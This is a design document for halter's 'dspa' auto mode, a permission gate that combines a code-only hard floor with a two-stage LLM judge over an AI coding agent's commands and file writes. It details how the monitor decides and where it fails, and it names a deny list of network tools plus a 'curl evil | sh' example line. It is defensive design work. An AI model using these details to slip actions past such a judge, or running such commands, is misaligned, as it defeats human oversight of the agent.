# dspa redesign — "auto mode" for halter

Status: **resolved via grill** (2026-08-23). All decisions Q1–Q10 are final;
phase 2 is ready to build.

## 1. Problem

The 2026-08-23 decision log (doc-extract session): **21 dspa-mode lines, 0
auto-allows, 21 prompts.**

- 17× inline python (`python3 - <<EOF` heredocs, `python3 -c`) — hard-gate
  rejects: `hasUnsafePattern` (input redirect / inline script). Judge never
  ran. This was the session's dominant prompt class.
- 1× file write outside base (skill dir) — hard-gate reject.
- 3× rm/cp+rm of `/tmp` scratch — passed the gate, judge declined (or failed).

Structural issue: the gate classifies *inline scripts* as the obfuscation
class ("never auto-allowable"), but a fully-visible heredoc is exactly the
case where the judge has the **most** information — the whole script body is
in the packet. The gate structurally blocks the one class dspa exists for.

The vision (user, 2026-08-23):

- **(a)** auto mode is envisioned to be *mostly auto*
- **(b)** dir approval happens once: prompt on first write to a dir, "Always"
  grants the dir
- **(c)** **content is always judged** — and approved when there's no problem
- **(d)** the judge needs **more context**

## 2. Reference: Claude Code auto mode

Shipped 2026-03, default for Pro/Max/Team since 2026-08-14. Sources:
[engineering post](https://www.anthropic.com/engineering/claude-code-auto-mode),
[permission-modes](https://code.claude.com/docs/en/permission-modes),
[auto-mode-config](https://code.claude.com/docs/en/auto-mode-config).

- Tiered: read-only builtins + **narrow** allow-rules resolve before the
  classifier; **broad rules are dropped in auto mode** (wildcarded
  interpreters, blanket shell) so the classifier sees the most capable
  commands. Deny/ask rules fire first, always.
- The classifier judges **content, not surface text**: written-then-run
  payloads are evaluated as payloads; `&&` chains are one action; an inline
  script that assembles a command is evaluated from context.
- **Two-stage**: fast single-token block-filter first; chain-of-thought
  re-review only if flagged. Allow-by-default; explicit user intent clears
  soft blocks.
- **Reasoning-blind**: sees user messages + tool calls; strips the agent's
  own messages and tool outputs (a compromised agent can't talk the
  approver into compliance).
- **Denials go to the agent**, not the user: block returns as a tool result
  ("find a safer path, treat the boundary in good faith"); escalation after
  3 consecutive or 20 total denials.
- Numbers: users approve 93–97% of manual prompts anyway; classifier caught
  more dangerous actions than humans in their eval; **17% false-negative
  rate** (approved-but-dangerous); agent works 9× longer between
  interruptions.

## 3. Design

### D1. Gate split: hard floor vs judgeable

`checkDspaGate` becomes two lists. The hard floor is code-only — the judge
never has authority over it. Everything else is judgeable: the judge sees
the full command + analysis + content and decides.

**Hard floor (kept):**

| Check | Rationale |
|---|---|
| MCP calls (all) | no model of server behavior (unchanged) |
| credential-pattern paths/rules | secrets are a class, not a judgment |
| parse errors | unverifiable |
| obscured command position (`$f`, `$( )` as the command) | cannot verify what runs |
| network egress (command or URL) | exfiltration surface (Q2, resolved: hard for phase 1; a trusted-domains setting is the future opening) |
| paths outside the **manual** bar (bash `outsidePaths`, file `outsideDir`; the bar is what manual mode auto-allows — D11) | **scope grants are the user's call, never the judge's** (Q1, re-confirmed D11) |
| rm carve-out violations (non-explicit/outside/self-writes not cleaned up) | unchanged; the carve-out stays |
| rm mass-deletion class (home/system dirs, ≥100 entries, bare glob) | unchanged, via the non-rm-dangerous filter |
| non-rm dangerous reasons in rm commands | (fixed 2026-08-23, `4957afc`) |

**Judgeable (new — today these hard-block):**

- inline script execution: `python3 -c …`, `python3 - <<EOF … EOF` (full
  body visible in the command text / packet)
- write/input redirects to in-base paths (`> f`, `<<EOF`)
- pipes and subshells whose content is visible (command substitution with a
  literal body)
- in-base `cp`/`mv`/`sed -i` file-modification patterns
- (the rm carve-out already judges rm; it simply gets a bigger "judgeable
  neighborhood")

**What the judge gets in each case** (packet, `judge-prompt.ts`): the
command rides in **full, untrimmed** (D11) and carries the full heredoc
body; script-file payloads ride fenced, in full. For inline scripts the
body *is* the command text — no new extraction needed. For file
operations the new content already rides in `JudgmentFileInput.content`.
Overflow is the existing judge-failure mode: the call fails → defer →
prompt (D11: no caps, so a safe long write can no longer force a defer).

### D2. Two-stage judge, intent at stage 2

Stage 1 = today's stateless packet + today's conservative prompt. Keeps the
LRU cache on the happy path. Verdict approve+low → auto-allow, done.

Stage 2 = runs **only when stage 1 is not approve+low**. Same operation,
plus a `## Session context` section (Q3, resolved — built from
`ctx.sessionManager.getEntries()`, no pi changes needed):

- last **4 user messages**, verbatim, **3000 chars total**, head-truncated
  with a marker — the user's actual request (unfenced intent channel, like
  Claude's classifier);
- **tool-call digest**: last **10 calls**, one line each `tool: target-label`
  (≤120 chars/line, targetOf-style), annotated as data;
- **session grants**: allowed write dirs + cwd-bound bash sigs, ≤10 lines.
- NEVER: agent prose, tool outputs, attachments (reasoning-blind).

Stage-2 system prompt adds the intent rules (Claude's framing): an action
must be what the user *authorized*, not merely related; a specific explicit
request ("compare these two OCR extractions") can clear a soft concern; a
vague one ("clean up") cannot. Stage 2's verdict is final: approve →
auto-allow (at a risk tier decided in Q4), reject/defer → D4.

**Verdict policy (Q4, resolved):** stage 1 auto-allows **approve+low**
only (cheap, conservative, cached). Stage 2 auto-allows **approve+low and
approve+medium** — the intent context exists to de-risk, so capping its
authority at "low" would nullify it. **approve+high and reject never
auto-allow in either stage.** (Mirrors Claude: allow-by-default once the
block list passes; they have no risk tier at all.)

Cache (Q8, resolved by construction): the LRU stays **stage 1 only**.
Stage 2 is uncached — its context hash includes the tool digest, and the
digest includes the just-blocked operation, so a re-call for the same
operation can never hit. Caching it would be dead code; the cost is one
extra local-model call on the unhappy path, which is what stage 2 already
is.

### D3. Dir-granted file writes are judged (dspa mode only)

Today: first write to a dir → prompt → "Always" →
`isInsideAllowedDir(write)` → `decideFile` returns **auto-allow** in its
fast path — the judge never sees the content, violating (c).

In dspa mode, a write into a session-granted dir returns a *judgeable*
decision instead of a gate auto-allow; the file packet already carries the
new content. Judge approve → auto-allow (+toast); otherwise → prompt (as
today). Outside-base writes are unchanged (hard floor, Q1). Manual/dspat
modes: unchanged (dir grant = auto-allow, as today).

First-write UX is unchanged: prompt offers Always-for-dir; thereafter the
dir is trusted but content is judged — full two-stage flow, same verdict
policy as bash (Q7, resolved): one code path, and intent can clear the
stateless judge's large-replacement defers.

D11 extends D3 (see below): the probe generalizes to every content-bearing
file-write auto-allow and, via the bash conversion in `gate()`, to granted
script executions.

### D4. Denials go to the agent, not the user

Judge **reject** (either stage) on a *judgeable* operation → no user prompt.
The tool call is denied with a result the agent sees:

> [Halter] blocked: <explanation>. Treat this boundary in good faith — find
> a safer way to achieve the same goal, or ask the user directly.

Escalation (Q5, resolved — Claude's numbers): **3 consecutive** judge-
rejects → the next rejected operation gets a real user prompt; **20 total**
per session → dspa auto-allow degrades off for the rest of the session
(toast announces; `/dspa` off+on re-arms). The consecutive counter counts
judge-rejects only and resets on any operation that completes successfully
(auto-allowed or user-approved); hard-floor blocks neither increment nor
reset. Counters are session-global.

**Defer** (uncertain / truncated / failure) → user prompt immediately
(Q6, resolved); defers never touch the 3/20 counters — the agent-retry loop
stays exclusive to explicit rejects, preserving fail-toward-prompting for
uncertainty.

### D5. What does NOT change

- `deniedPaths` hard blocks, credential warnings, fail-closed boundaries.
- The rm carve-out mechanics (`checkRmTargets`).
- cwd-bound bash grants (exact signatures) — narrow enough to keep running
  before the judge in all modes (Claude keeps narrow rules too).
- The dsp bypass mode, dspat display mode, the mode machine.
- Decision-log design: verdict *content* stays session-scoped; the gate
  layer accumulates. The stop-tag (`2f0da9c`) already splits gate vs judge
  in `decisions.jsonl`. **Debug exception (2026-08-25):** a dspa REJECT
  verdict's explanation is logged verbatim as `judgeDeny` on the
  fall-through prompt line — a raw debug aid for judge behavior, read by
  a human inspecting the log, never aggregated into stats.

### D6. Log additions (Q9, resolved)

- new entry kind `deny`: a judge-rejected operation that went to the agent
  (not the user). `reason: "dspa: judge denied (stage N)"` — **plumbing
  only, no model text** (verdict content stays session-scoped per the log's
  design note; the stage number is plumbing, which layer called). Keeps
  policy blocks (`block`) and user prompts (`prompt`) distinct, gives the
  top-N loop a fourth channel: what the judge is eating silently.
- auto-allow reason gains the stage: `dspa: judge approved (stage 2, model)`.

### D7. Resolve-then-gate for unbound paths (2026-08-24 log)

The parser emits sentinels when it cannot bind a path to a location:
`<unresolved-cwd>` (a cd inside a `||` chain — the side's directory is
genuinely ambiguous: original cwd or the cd target) and
`<unresolved-var>` (opaque variable). The floor's outside-base stop used to
treat them like resolved outside paths. Live cases from the 2026-08-24
log: a read-only `cd ~/… && ls || echo; grep; node -e` inspection flow
and `SOCKET_DIR=${PI_TMUX_SOCKET_DIR:-${TMPDIR:-/tmp}/…}` probes — all
forced into manual prompts with unhelpful sentinel reasons instead of a
concrete dir or the judge.

**Resolve first, then the ordinary bar** (floor only, dspa mode):

1. **Opaque vars** resolve from command-local `VAR=value` assignments:
   literal values, `${X:-default}` default chains (the default is taken
   when X has no local assignment — the environment may set X elsewhere,
   which the judge still sees in the full text), `~` expansion.
2. **Unresolved cwd** resolves against every candidate base the ambiguous
   side could run under (2026-08-25 audit): the session cwd plus the target
   of every literal cd in the command (threaded the way the parser tracks
   them, relative targets resolved against the session cwd — never the
   test/process cwd). A `..` tail can escape from ANY candidate, so every
   candidate is checked against the base, not just the last cd target.
3. The resolved path gets the ordinary in-base/grant check: inside or
   granted → judgeable; concrete outside-base path → stop **naming the dir**
   (one Always-for-dir makes later runs judgeable, D3-style).
4. Still unresolvable → **floor stop, never judgeable** (2026-08-25 audit,
   Q1): an unassigned/externally-set var (`mkdir -p "$FOO"`) or any
   unresolvable cd (`cd $D && … || …`) means the location is not
   statically knowable — and a location the user cannot see is a scope
   grant, which is the user's call, not the judge's. The stop names the
   cause (`runtime location unresolvable ($FOO)` / `runtime working
   directory unresolvable`). This flips the 2026-08-24 decision (point 4
   was "judgeable"); the D7 premise that "the judge has session context
   the static parser lacks" is empirically false for locations the
   parser cannot even enumerate.

Unchanged: resolved outside-base paths still stop; the rm carve-out keeps
non-explicit rm targets on the floor (`rm -rf $X`); obscured positions,
credentials, network egress. Manual/dspat modes are unchanged (no floor
there — the prompt path was already the outcome).

### D8. Shrink the floor: package-manager run forms + /tmp scratch rm are judgeable (2026-08-24 log)

The stop-tag data settled it: in the 2026-08-24 log (231 lines) **all 26
dspa prompts were floor stops — the judge stopped zero of them** (26
approvals, 0 denies). 11 of the 26 were shapes a human (and the judge)
would plainly allow: 7× `network egress (npx/uv/bun)` — the `npx tsc`,
`npx vitest`, `uv run` dev-loop probes — and 4× `rm target outside session
base` for `/tmp` scratch cleanup (`rm -f /tmp/width-probe.log`). The floor
was intercepting exactly the operations the judge should have decided, and
the prompts offered no useful Always tier for the compound npx probe shape.

**Run forms are judgeable** (floor only, dspa mode). A package-manager
RUN form executes local/cached code; the package name and args are visible
in the judge's full-text input, so the judge — not a floor stop — decides.
Fetch forms stay on the floor: fetch = arbitrary postinstall execution +
registry access, and a lenient local judge is no backstop for that.

- `npx …`, `uvx …`, `bunx …` — inherently run-a-package (fetches on miss;
  the judge sees the name).
- `npm run|exec|x`, `pnpm run|dlx|exec|x`, `yarn run|dlx|x`,
  `uv run|x` — explicit run forms only (the `npm test` shorthand and
  `yarn <script>` stay on the floor, conservatively).
- `bun <anything-but-fetch>` — the interpreter form (`bun index.ts`,
  `bun x tsc`, `bun -e …`); the fetch verbs (`install`, `add`, `update`,
  `publish`, …) stay on the floor.
- Unchanged on the floor: raw egress (curl/wget/nc/ssh/scp/rsync), `git
  push|fetch|pull|clone`, http(s) URLs in the text, every fetch form
  (`npm install`, `uv sync|add`, `bun install|add`, `pnpm install`, pip),
  docker/podman/kubectl/aws/gcloud/az. Manual/dspat analysis is untouched
  (this is floor policy, not the shared egress analysis).

**Non-recursive /tmp scratch rm is judgeable** (rm carve-out, dspa mode).
/tmp is the conventional world-scratch area; `rm -f /tmp/probe.log` is the
normal cleanup pattern. An rm target directly under `/tmp/` that is
explicit (the existing bar: no globs/vars/tilde) and non-recursive passes
the floor to the judge. Computed/glob targets stay on the floor. (D11:
concrete recursive/bare `/tmp` rm moved with the bar — /tmp is
config-allowed, i.e. in the manual bar — so it is judgeable like in-cwd
recursive rm; the judge's deny rule gates mass deletion.)

What did NOT change: outside-base reads stay user-only (Q1); MCP stays
never-auto-allowed; the single `rm target not explicit ($d)` stop is by
design.

### D9. Root scans get a dedicated stop; the root is never an Always grant (2026-08-24)

The log's `touches paths outside base (/)` stop was a true positive —
`find / -name tty.js` really scans root — but the generic reason hid what
the command does, and the prompt on it was worse than the stop: its
"Always" tiers offered `Read /*` (the primary rule carried readDirs ["/"]),
and an /etc file prompt's broader umbrella reached up to `/` (one click =
write the whole disk). A full-disk scan is conspicuous in plain sight —
no judge ambiguity, no obfuscation — so it gets its own deterministic
reason instead of the generic outside-base one.

**Dedicated root-scan stop** (floor + analysis, all modes):

- The disk evaluator flags a scanner (`find`, `grep`, `egrep`, `fgrep`,
  `rg`, `ag`, `locate`) whose path argument is exactly `/` with
  `full filesystem scan (<cmd> /)` (medium — read-only traversal, heavy
  and conspicuous, not dangerous).
- The dspa floor stops the same shape with the same reason before the
  judge (the judge could approve a root scan; it should not need to).
- `find /etc`, `ls /`, `grep -rn x /home/u` keep the ordinary
  outside-base reason (they are not full-filesystem scans).

**The root is never an Always grant** (prompt + rule generation, all modes):

- Bash dir tiers filter `/` out of `outsideDirs`: a root-only path prompt
  (`find /`) offers NO dir tier — no dead "Always: Read /*" button; mixed
  prompts (`ls / /etc`) grant only the non-root dirs.
- File prompts: a file directly under `/` falls back to the file-level
  grant (label + rule match); the broader umbrella (inside- and
  outside-cwd) stops before root, so an `/etc` file prompt offers no
  broader option at all.
- Scope: this is about the filesystem ROOT specifically. Granting
  `/home/u` or `~/.pi` remains a legitimate one-click choice — Q1's
  user-only scope grants are unchanged.

### D10. Trusted packages: fetchable run forms get a deterministic gate (2026-08-24)

D8 made run forms judgeable — but for a FETCHABLE run form (`npx <pkg>`,
`uvx <pkg>`, `npm exec <pkg>`, `pnpm dlx <pkg>`, `bun x <pkg>`) that meant
the judge was the SOLE gate on "download and run arbitrary code on cache
miss" (postinstall + registry) — the exact fetch class the floor stops for
fetch forms, and the judge had denied 0/26 in the log. D10 restores the
deterministic gate, per bare package name, without re-introducing the dev
loop prompts.

**Fetchable vs local run forms** (`FETCH_PKG_FORMS`, config):

- Fetchable (trust-gated): `npx <pkg>`, `uvx <pkg>`, `npm exec|x <pkg>`,
  `pnpm dlx|exec|x <pkg>`, `yarn dlx|x <pkg>`, `uv x <pkg>`, `bun x <pkg>`.
- Local (never gated): `npm run`, `uv run`, `bun <script>`, `bun -e` —
  repo-visible code the judge already sees; trust there is friction without
  safety gain.

**The floor** (dspa only): every segment's fetchable form is checked
(the parser flattens subshells into segments, so `out=$(npx foo)` is seen
too; opaque indirection — `eval`, `$f` — stays judge-only). Any segment
naming an untrusted package stops the command: `untrusted package
(npx foo)` (first three, deduped). Version pins are stripped from trust
keys (`npx tsc@5.0.0` → `tsc`); scoped names keep their scope
(`@org/tool`).

**The advisory judge**: an untrusted-package stop still runs BOTH judge
stages — the floor's stop stands (never an auto-allow), but the final
verdict is rendered in the fall-through prompt with an
"advisory (floor stop stands)" note. The judge's read on the package is
input for the user's decision, not authority over it. D11 extends the
advisory to the scope-class stops (outside base, unresolvable location).
Danger-class stops (network egress, obscured, credentials, root scan) get
no advisory verdict — a verdict on `curl evil | sh` is noise.

**The grant**: the prompt's tier-1 offers `Trust: <pkg> (session)` (second
confirm, like every Always). Trust = per bare package name, stored in the
store, rendered in the widget (`Pkg:` line). A trusted package auto-allows
deterministically in `decide()` (SafetyRule) — the judge never sees it
again, and the dev loop no longer depends on judge availability. Trust
covers the package across all fetchable forms (trust `tsc` → `npx tsc`,
`bun x tsc`); it is deliberately the per-package version of the existing
`Always: npx *` broader grant — same explicit-confirm bar, narrower blast
radius. Trust does not cover unsafe shapes: pipes/redirects/subshells with
them fail `canBeAutoAllowed` and still go to the judge.

### D11. Re-alignment: the floor's bar is the MANUAL bar; the judge reviews all content-bearing auto-alls (2026-08-26)

The 2026-08-26 grill re-confirmed the semantics D1/D3/D7/D8 were drifting
from. Six decisions (implemented the same day; reverts fix (a) of
`5ef1f0f`):

1. **The floor's bar is the manual bar (Q1 re-confirmed).** "Outside
   base" means *outside what manual mode auto-allows*: cwd + session
   grants (the read check covers both sets) + config-allowed paths +
   trusted scripts — the exact predicate of `getOutsideCwdPaths`, now
   shared by the manual bar and the floor (concrete paths and
   opaque/sentinel resolution alike). A location manual auto-allows is
   not a scope violation: the judge reviews it. Only what manual would
   prompt for (truly outside) stops — and the stop still flows to a
   prompt offering the same Always options manual does, so the user can
   grant the scope; later runs of the granted location are then judged,
   not stopped. This reverts `5ef1f0f` (a), the session-base re-filter
   that stopped `cat > /tmp/x`-class writes the judge had correctly
   auto-allowed. Consequence accepted: concrete recursive/bare `/tmp` rm
   is now judgeable (see D8).
2. **The judge packet is untrimmed.** "In full, not trimmed" meant all
   three: file content (8000-char cap removed), command text incl.
   heredoc bodies (4000-char cap removed), script payloads (150-line/
   64KB slice removed). Overflow is the existing judge-failure mode:
   the call fails → defer → prompt. MCP args and the segment digest
   keep their head-cuts — they are digests, not write content.
3. **Clause A extended: the judge reviews ALL content-bearing manual
   auto-allows.** Every file-write auto-allow (dir/file grant,
   config-allowed, project-pi) converts to a judged prompt (the D3 probe
   generalizes: `judgeDirGrants` → `judgeWriteAutoAllows`), and a bash
   auto-allow whose analysis carries an extractable script payload
   (granted interpreter execution) converts the same way. Reads and
   payload-less commands are never judged. Judge OFF/INVALID → no
   conversion (the manual auto-allow stands — dspa never adds a prompt
   on its own; a runtime judge failure still falls toward the prompt).
   Verdict policy unchanged (D2/D4): s1 approve+low, s2
   approve+{low, med}; reject/defer → prompt with the verdict.
4. **Advisory verdicts on scope-class floor stops.** Outside-base stops
   (bash + file), unresolvable-location stops, and untrusted-package
   stops (D10) run BOTH judge stages; the final verdict renders in the
   prompt as advisory input — the floor's stop stands (never an
   auto-allow). Danger-class stops stay bare (see D10).
5. **The Trust option stays.** Grilled as possibly redundant vs Always —
   it is not: Trust is per bare package across ALL fetchable forms
   (npx/uvx/bun x/npm exec/pnpm dlx/yarn dlx/uv x) with version pins
   stripped; an Always signature matches the exact form as typed; the
   broader `Always: npx *` covers any package. All are deterministic
   post-grant; none cover unsafe shapes.
6. **The floor keeps**: unresolvable-location stops (now with advisory
   verdict), full-filesystem scans, and rm targets outside the bar.

### D12. Converge: unresolved tokens resolve to determinism (2026-08-27)

The 2026-08-27 session (dspa): the same unbound-token command prompted
repeatedly — each run paid a prompt (and an LLM verdict) for the same
unresolvable location, and the prompt offered a dead grant (the token's
static prefix, which a marker can never satisfy). Target: a repeated
operation reaches steady state where the gate is deterministic and no LLM
call is needed.

**Tier 0 — deterministic, no prompt at all.** The parser now handles two
shapes that used to fall into opaque markers:

1. **Pinned-tail references** — `prefix/$var/tail` (any number of static
   segments around one unbound variable, no `$`/backtick/backslash/`..` in
   the tail). If the static prefix sits inside the read bar, the reference
   can only read inside it → the marker is dropped entirely (no prompt,
   no unresolved entry). `grep … ~/.pi/agent/extensions/$e/*.ts` is the
   canonical case: `~/.pi` is read-allowed → auto-allow.
2. **Multi-line literal arguments are script bodies, not paths.** A
   literal argument containing a newline and no runtime expansion (`node
   -e '<17-line script>'`, `python3 -c "…"`) is excluded from path
   extraction — it is executed content, and the judge already sees it in
   the command text. It no longer emits an opaque ref or a bogus outside
   dir; the command prompts (or doesn't) on its own risk.

**Tier 1 — LLM path resolver (first run only).** When a prompt still
unresolves a token, the judge model (same settings as the judge — a second
use, not a new one) reports the runtime dirs for each token, grounded only
in the command text (assignments, loop in-lists, tool semantics). Display:
`→ LLM: dir1, dir2` under the token in the prompt. The gate never
auto-allows on it (Q1 stands) — it becomes binding only when the user
accepts a grant.

**Steady state — confirmed resolutions.** `store.confirmResolution(
token, dirs)` (session-scoped) records a user-accepted token → dirs:

- **Always / Always (paths)**: the option grants exactly the union of
  concrete outside dirs and the LLM/confirmed dirs (`pathGrantDirs`);
  every resolution is persisted.
- **One-shot Yes / non-paths Always**: only tokens whose dirs are ALL
  inside the manual bar are persisted (Yes vouches for this exact run;
  in-bar dirs never needed a grant, so confirming them only makes the
  next run judgeable).

Confirmed resolutions are consulted at the **analysis layer** (one
derivation, deterministic — no LLM), so the manual bar and the dspa gate
agree on a resolved token:

- The raw text of an unbound token is **not a location** — it never joins
  the approval bar (its value is unknown or confirmed). Previously it
  sat in `outsidePaths` as a phantom: it kept `needsPathApproval` true
  even after an in-bar confirmation, so the manual bar re-prompted a
  resolved token forever. Only the marker (unconfirmed) or the confirmed
  dirs are the location authority.
- All confirmed dirs in the manual bar → the token leaves the bar
  entirely (no marker, no raw text) → the command auto-allows like any
  in-bar one.
- Any confirmed dir outside the bar → it is named as a concrete outside
  path: the gate stops `touches paths outside base (…)` carrying
  `confirmedOutside`, and the manual bar's "Always (paths)" grants
  exactly it — one click converges the token (the next run finds it
  in-bar).

The gate's D7 sentinel pass is kept as a defensive twin of the analysis
layer (it resolves any sentinel that reaches the floor).

**Observability — unresolved log.** `.log/unresolved.jsonl` (same toggle
and rotation as the decision log) records each token's fate:
`outcome: prompted | gate-stop | auto-allowed`, the LLM's suggestion, the
user's decision, and whether it was confirmed. Convergence is visible as
the same token flipping from `prompted` to `auto-allowed` across runs.

## 4. Phasing

- **Phase 1 — done**: rm-branch non-rm-dangerous filter (`4957afc`); dspa
  stop-tag in the decision log (`2f0da9c`). Suite 3210.
- **Phase 2 — done** (2026-08-23): D1 gate split (`0ac786e`), D2 stage 2
  (`3ee25e8`), D6 log kind (`360bac4`). The original 17 doc-extract python
  lines were lost when the pre-reload log was deleted; the fixture is a
  representative reconstruction (test/dspa-gate.test.ts, "doc-extract
class"). Suite 3229.
- **Phase 3a — done** (2026-08-24): D3 (dir-granted file writes judged —
  `judgeDirGrants` flag in decide/decideFile, the probe in `gate()`, floor
  exemption in `dspa-gate.ts`). Suite 3239.
- **Phase 3b**: D4 (denial flow + escalation counters), armed with
  stop-tag + deny-kind data. Tally after the 2026-08-24 log (220 lines):
  22 judge verdicts, 0 rejects.
- **Phase 3c — done** (2026-08-24): D7 (resolve-then-gate for unbound paths
  in the floor: command-local var assignments + the `||`-ambiguous cd target
  resolve to the ordinary bar; unresolvable → judgeable). Suite 3258.
- **Phase 3d — done** (2026-08-24): D8 (floor shrink: package-manager run
  forms + non-recursive /tmp scratch rm are judgeable; fetch forms and
  recursive/var/glob rm stay on the floor). Suite 3263.
- **Phase 3e — done** (2026-08-24): D9 (dedicated `full filesystem scan
  (<cmd> /)` stop in the floor + analysis; the root is never an Always
  grant — bash dir tiers and file umbrellas stop before `/`). Suite 3272.
- **Phase 3f — done** (2026-08-24): D10 (trusted packages — fetchable run
  forms stop on `untrusted package (…)` with the judge's verdict shown
  advisory in the prompt; a `Trust: <pkg> (session)` option grants
  deterministic auto-allow for that package). Suite 3288.
- **Phase 3g — done** (2026-08-26): D11 (re-alignment — the floor's bar
  is the manual bar; the judge packet is untrimmed; the judge reviews
  all content-bearing manual auto-alls — file writes and granted script
  executions; advisory verdicts on scope-class floor stops; reverts
  `5ef1f0f` (a); log-inspect gains the resolution-mismatch audit check
  and `dspa --reasons`). Suite 3404.
- **Phase 3h — done** (2026-08-27): D12 (convergence — pinned-tail refs
  and multi-line literal args resolve at the parser (Tier 0); LLM path
  resolver with `→ LLM:` prompt lines; confirmed resolutions make the
  gate's sentinel pass deterministic; `pathGrantDirs` union grant;
  `.log/unresolved.jsonl`). Suite 3464.

## 5. Open questions (grill order)

1. **Q1 — RE-CONFIRMED 2026-08-26 (D11): outside the *manual* bar stays on
   the hard floor.** "Outside base" = outside what manual mode auto-allows
   (cwd + grants + config-allowed + trusted scripts). Scope grants are a
   user-only decision (Always-for-dir); the judge judges content inside
   granted scope — including manual-bar locations — and can never grant
   scope itself. An outside-base stop still prompts with the manual
   Always options, so the user can grant the scope.
2. **Q2 — RESOLVED: network egress stays on the hard floor for phase 1.**
   Intent doesn't de-risk a URL; the future opening is a trusted-domains
   setting (halter's `autoMode.environment`), revisit with stop-tag data.
3. **Q3 — RESOLVED as specified**: 4 user messages / 3000 chars + 10-line
   tool digest (≤120 chars/line) + grants list (≤10 lines), reasoning-blind.
   Source: `ctx.sessionManager.getEntries()`. Timeout bump only if measured.
4. **Q4 — RESOLVED**: stage 1 approve+low only; stage 2 approve+{low,
   medium}; high/reject never auto-allow. Escalation thresholds → Q5.
5. **Q5 — RESOLVED**: deny → agent with the good-faith instruction; 3
   consecutive → user prompt; 20 total → session degrade. Reset on success,
   global counters.
6. **Q6 — RESOLVED**: defer → user prompt; defers never touch the 3/20
   counters.
7. **Q7 — RESOLVED**: file writes get the full two-stage flow, same
   verdict policy as bash.
8. **Q8 — RESOLVED**: stage 2 uncached (its context hash includes the
   just-blocked op → can never hit); LRU stays stage 1 only.
9. **Q9 — RESOLVED**: new kind `deny`, reason `dspa: judge denied (stage
   N)`, no model text.
10. **Q10 — RESOLVED**: keep the proposed phasing. Phase 2 = D1+D2+D6
    (widening; rejects still prompt). Phase 3 = D3+D4 (the silent denial
    flow + dir-granted file writes), armed with stop-tag + deny-kind data —
    D4 changes what the user *doesn't see*, so it goes live last, with
    numbers.
